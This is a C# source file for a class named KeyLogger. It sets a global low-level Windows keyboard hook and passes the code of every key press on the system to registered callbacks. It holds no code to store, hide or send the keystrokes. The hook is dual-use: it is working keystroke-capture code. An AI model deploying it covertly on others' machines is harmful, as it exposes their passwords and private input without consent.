using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;

namespace IDK {
    
    /// <summary>
    /// Logs key down events
    /// </summary>
    class KeyLogger {

        // callback delegate to be used elsewhere on the application to listen to key events
        public delegate void Callback(int vkCode);

        private Thread Worker; // thread on which application message loop is running
        private KeyListener Listener; // listens to key events

        /// <summary>
        /// Class constructor
        /// </summary>
        public KeyLogger() {
            Worker = new Thread(new ThreadStart(this.Run));
            Listener = new KeyListener();
        }

        /// <summary>
        /// Adds a callback method to be called when key down event occurs
        /// </summary>
        /// <param name="callback">callbak method to be called</param>
        public void AddCallback(Callback callback) {
            Listener.AddCallback(callback);
        }

        /// <summary>
        /// Method that gets called when worker thread starts
        /// </summary>
        private void Run() {
            Listener.Run();
        }

        /// <summary>
        /// Starts key logging (starts worker thread). Once started, the worker thread runs for the lifetime of the application
        /// </summary>
        public void StartWorker() {
            Worker.Start();
        }


        /// <summary>
        /// Class that listens to global key clicks
        /// </summary>
        private class KeyListener {

            // key event constants
            private const int WH_KEYBOARD_LL = 13;
            private const int WM_KEYDOWN = 0x0100;

            // hook id
            private IntPtr HookID = IntPtr.Zero;

            // delegate to process key events
            private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

            // reference to the low level hook callback so that gc doesn't collect the callback delegate
            private LowLevelKeyboardProc LowLevelHookCallback;

            // gets called when key down events occur
            private Callback M_Callback;

            /// <summary>
            /// Adds a callback to be called when key down event occurs
            /// </summary>
            /// <param name="callback">callback method to call</param>
            public void AddCallback(Callback callback) {
                M_Callback += callback;
            }

            /// <summary>
            /// Sets (and unsets) hook and starts listening to key events
            /// </summary>
            public void Run() {
                LowLevelHookCallback = HookCallback;
                HookID = SetHook(LowLevelHookCallback);
                Application.Run();
                UnhookWindowsHookEx(HookID);
            }

            // sets the keyboard hook
            private IntPtr SetHook(LowLevelKeyboardProc proc) {
                using (Process curProcess = Process.GetCurrentProcess())
                    using (ProcessModule curModule = curProcess.MainModule) {
                        return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                            GetModuleHandle(curModule.ModuleName), 0);
                }
            }

            // called when keys are pressed
            private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
                if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN) {
                    int vkCode = Marshal.ReadInt32(lParam);
                    M_Callback(vkCode);
                }

                return CallNextHookEx(HookID, nCode, wParam, lParam);
            }


            // external methods
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool UnhookWindowsHookEx(IntPtr hhk);

            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

            [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern IntPtr GetModuleHandle(string lpModuleName);
        }
    }
}
